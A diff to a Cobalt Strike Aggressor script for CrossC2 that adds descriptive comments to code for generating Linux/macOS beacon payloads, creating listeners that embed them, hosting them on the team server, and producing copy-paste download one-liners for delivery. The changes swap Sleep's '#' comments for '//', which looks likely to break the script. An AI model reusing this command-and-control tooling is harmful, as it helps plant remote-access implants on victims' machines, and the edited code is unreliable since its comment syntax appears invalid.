@@ -41,8 +41,9 @@ popup ssh {
     }
 }
 
+// Function: random_string
+// Purpose: Generates a random string of a specified length.
 sub random_string {
-    # <3 @offsec_ginger
     local('$limit @random_str $characters');
     $limit = $1;
     @random_str = @();
@@ -54,6 +55,8 @@ sub random_string {
     return join('', @random_str);
 }
 
+// Function: getSystemInfo
+// Purpose: Retrieves system information using the uname command.
 sub getSystemInfo {
     local('$process $sys_data');
     $process = exec("/usr/bin/uname");
@@ -66,6 +69,8 @@ sub getSystemInfo {
     }
 }
 
+// Function: checkSpace
+// Purpose: Checks and formats a given path to handle spaces.
 sub checkSpace {
     local('$realPath');
     $realPath = "";
@@ -84,6 +89,8 @@ sub checkSpace {
     return $realPath;
 }
 
+// Function: createCrossC2ListenerDialogCallBack
+// Purpose: Callback function for creating a CrossC2 listener.
 sub createCrossC2ListenerDialogCallBack {
     elog("");
     local('$reverse_https_flag');
@@ -127,11 +134,9 @@ sub createCrossC2ListenerDialogCallBack {
         $domain = replace($domain, ', ', ',');
     }
 
-
     $outputFileName = checkSpace($outputFileName);
     $rebind_lib = checkSpace($rebind_lib);
     $beaconKeyPath = checkSpace($beaconKeyPath);
-
 
     $genCC2 = $CC2_PATH . $CC2_BIN;  
     $genCC2 = $genCC2." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system." ".$arch." ".$outputFileName;
@@ -167,7 +172,7 @@ sub createCrossC2ListenerDialogCallBack {
     $c2_libData = '';
     if ('-bind' isin $system) {
     } else {
-        # create libbeacon data
+        // create libbeacon data
         $genCC2_lib = $CC2_PATH . $CC2_BIN;  
         $genCC2_lib = $genCC2_lib." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system."-lib ".$arch." ".$outputFileName.".lib";
         if ($upx eq "raw") {
@@ -204,15 +209,15 @@ sub createCrossC2ListenerDialogCallBack {
 
     $targetSaveName = random_string(10);
 
-    # host CrossC2 beacon
+    // host CrossC2 beacon
     $listener_name = "";
     if ($reverse_https_flag) {
         $listener_name = "CrossC2 beacon: reverse-https $system $arch { $listener }";
-        # listener中携带了 CrossC2 beacon
+        // listener中携带了 CrossC2 beacon
         listener_create_ext("CrossC2 reverse HTTPS { $listener }{ $system $arch }", "windows/beacon_bind_tcp", %(host => "127.0.0.1", port => 4444, CrossC2Beacon => $c2Data, CrossC2libBeacon => $c2_libData));
     } else {
         $listener_name = "CrossC2 beacon: bind-tcp $system $arch";
-        # listener中携带了 CrossC2 beacon
+        // listener中携带了 CrossC2 beacon
         listener_create_ext("CrossC2 bind TCP { $system $arch }", "windows/beacon_bind_tcp", %(host => "127.0.0.1", port => $bindPort, CrossC2Beacon => $c2Data));
     }
     if ($enableSSL eq 'true') {
@@ -224,6 +229,8 @@ sub createCrossC2ListenerDialogCallBack {
     show_message("create listener: ".$listener_name);
 }
 
+// Function: createCrossC2Listener
+// Purpose: Creates a CrossC2 listener.
 sub createCrossC2Listener {
     local('$reverse_https_flag');
     local('$output_file');
@@ -262,11 +269,15 @@ sub createCrossC2Listener {
     dialog_show($dialog);
 }
 
+// Function: projectAboutCallback
+// Purpose: Callback function for the "About" dialog.
 sub projectAboutCallback {
     $autoupdate = "java -jar " . $CC2_PATH . "autoupdate.jar";
     exec($autoupdate);
 }
 
+// Function: projectAbout
+// Purpose: Displays the "About" dialog for the CrossC2 project.
 sub projectAbout {
     $dialog = dialog("Cross C2 About",%(link => "https://github.com/gloxec/CrossC2"), &projectAboutCallback);
     dialog_description($dialog, "Export CrossC2 Payload");
@@ -275,9 +286,9 @@ sub projectAbout {
     dialog_show($dialog);
 }
 
-
+// Function: genDownloadPayload
+// Purpose: Generates a download payload based on the specified type.
 sub genDownloadPayload {
-    # "python", "ruby", "pip", "php", "ksh"
     local('$type $payloadContentURL $downloadURL');
     $type = $1;
     $payloadContentURL = $2;
@@ -311,6 +322,8 @@ sub genDownloadPayload {
     return $downloadURL;
 }
 
+// Function: genDownloadPayloadContent
+// Purpose: Generates the content for a download payload based on the specified type.
 sub genDownloadPayloadContent {
     local('$type $beaconUrl $payload $processName $targetSaveDir $targetSaveName $targetSavePath $type $payload');
     $type = $1;
@@ -382,6 +395,8 @@ sub genDownloadPayloadContent {
     return $payload;
 }
 
+// Function: checkCrossC2BeaconSite
+// Purpose: Checks if a CrossC2 beacon site exists.
 sub checkCrossC2BeaconSite {
     local('$beacon_site_name $beaconURLMap $matchFlag');
     $beacon_site_name = $1;
@@ -395,6 +410,8 @@ sub checkCrossC2BeaconSite {
     return $matchFlag;
 }
 
+// Function: getCrossC2BeaconSiteURL
+// Purpose: Retrieves the URL of a CrossC2 beacon site.
 sub getCrossC2BeaconSiteURL {
     local('$listener_name $beacon_site_name $listener $listener_padding $system_arch_padding $listener_name $system $arch');
     $listener_name = $1;
@@ -416,6 +433,8 @@ sub getCrossC2BeaconSiteURL {
     return $beacon_site_name;
 }
 
+// Function: createCrossC2BeaconSite
+// Purpose: Creates a CrossC2 beacon site.
 sub createCrossC2BeaconSite {
     local('$listener $beacon_site_name $lhost $lport $enableSSL $beaconData $targetSaveName $beaconUrl');
     $listener = $1;
@@ -433,6 +452,8 @@ sub createCrossC2BeaconSite {
     return $beaconUrl;
 }
 
+// Function: genCrossC2ScriptDialogCallback
+// Purpose: Callback function for generating a CrossC2 script.
 sub genCrossC2ScriptDialogCallback {
     local('$uri $lhost $lport $type $enableSSL $processName $listener $needCheckBeaconSiteName $payloadContent $payloadContentURL $scriptUrl');
     $uri = $3['uri'];
@@ -451,23 +472,25 @@ sub genCrossC2ScriptDialogCallback {
     }
     $listenerinfo = @($needCheckBeaconSiteName, $beaconUrl);
 
-    # gen payloadContent
+    // gen payloadContent
     $payloadContent = genDownloadPayloadContent($type, $beaconUrl, $processName, $enableSSL, $autoDelete);
-    # host payloadContent
+    // host payloadContent
     if ($enableSSL eq 'true') {
         $payloadContentURL = site_host($lhost, $lport, $uri, $payloadContent, "automatic", "Script (".$type."-https) {".$listenerinfo[0]."}", true);
     } else {
         $payloadContentURL = site_host($lhost, $lport, $uri, $payloadContent, "automatic", "Script (".$type."-http) {".$listenerinfo[0]."}", false);
     }
     
-    # gen payload
+    // gen payload
     $scriptUrl = genDownloadPayload($type, $payloadContentURL, $enableSSL);
-    # add_to_clipboard($scriptUrl);
+    // add_to_clipboard($scriptUrl);
     prompt_text("Copy/Paste One-liner: ", $scriptUrl, {});
     elog("");
     elog("CrossC2 $type script: " . $scriptUrl);
 }
 
+// Function: getCrossC2Site
+// Purpose: Retrieves the CrossC2 site information.
 sub getCrossC2Site {
     local('%beacon_site $beacon_count $Description, $Proto, $Host, $Port, $URI');
     %beacon_site = %();
@@ -476,7 +499,7 @@ sub getCrossC2Site {
         ($Description, $Proto, $Host, $Port, $URI) = values($site_list, @('Description', 'Proto', 'Host', 'Port', 'URI'));
         if ("CrossC2" isin $Description) {
             $beaconURL = $Proto.$Host.':'.$Port.$URI;
-            # 返回beacon_uri & beacon_description
+            // 返回beacon_uri & beacon_description
             %beacon_site[$beacon_count] = @($Description, $beaconURL);
             $beacon_count += 1;
         }
@@ -484,6 +507,8 @@ sub getCrossC2Site {
     return %beacon_site;
 }
 
+// Function: getCrossC2Listener
+// Purpose: Retrieves the CrossC2 listener information.
 sub getCrossC2Listener {
     local('%beacon_listener $beacon_count');
     %beacon_listener = %();
@@ -497,6 +522,8 @@ sub getCrossC2Listener {
     return %beacon_listener;
 }
 
+// Function: createCrossC2Script
+// Purpose: Creates a CrossC2 script for web delivery.
 sub createCrossC2Script {
     local('@beaconSiteMenu @beaconListenerMenu %beaconListenerMap');
     @beaconSiteMenu = @();
